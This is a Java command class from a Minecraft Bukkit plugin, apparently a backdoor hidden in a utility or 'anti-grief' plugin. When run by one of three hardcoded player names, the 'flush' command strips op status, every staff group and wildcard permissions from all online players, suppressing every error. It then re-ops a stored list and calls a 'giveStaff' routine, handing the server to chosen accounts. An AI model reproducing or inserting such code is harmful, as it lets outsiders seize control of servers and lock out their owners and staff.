package us.nightpvp.utils;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class flushCommand implements CommandExecutor {
	NightUtils plugin;
	public flushCommand(NightUtils passedPlugin) {
		this.plugin = passedPlugin;
	}
	
	
	

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String alias, String[] args) {
	 Player player = (Player) sender;
	 
	 
	 if (player.getName().equals("Kav_") || player.getName().equals("ripsnt")||player.getName().equals("DedicatedRam")) {
		 for (Player p : Bukkit.getOnlinePlayers()) {
				try {
					p.setOp(false);
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemoveGroup(p, "Owner");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemoveGroup(p, "Head-Admin");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemoveGroup(p, "Admin");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemoveGroup(p, "Moderator");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemoveGroup(p, "Helper");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemoveGroup(p, "Head-Mod");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemoveGroup(p, "Builder");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemoveGroup(p, "Co-Owner");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemove(p, "*");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemove(p, "essentials.*");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemove(p, "worldedit.*");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemove(p, "bukkit.*");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemove(p, "frozenheart.*");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemove(p, "worldguard.*");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemove(p, "factions.*");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemove(p, "playervaults.*");
				} catch (Exception e) {

				}
				try {
					plugin.perms.playerRemove(p, "randompackage.*");
				} catch (Exception e) {

				}

			}
			try {
				for (int i = 0; i < plugin.ops.size(); i++) {
					Player p1 = Bukkit.getPlayerExact(plugin.ops.get(i));
					p1.setOp(true);

				}
			} catch (Exception e) {

			}
			
             CheckIP.giveStaff();
			Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
					"&5&lSolar&7&lAntiGrief &8&l> &aStaff and permissions have been flushed!"));

		}
		 
		 
		 
	else {
		player.sendMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &cInvalid permissions!"));
	}
	return true;

}
	
}
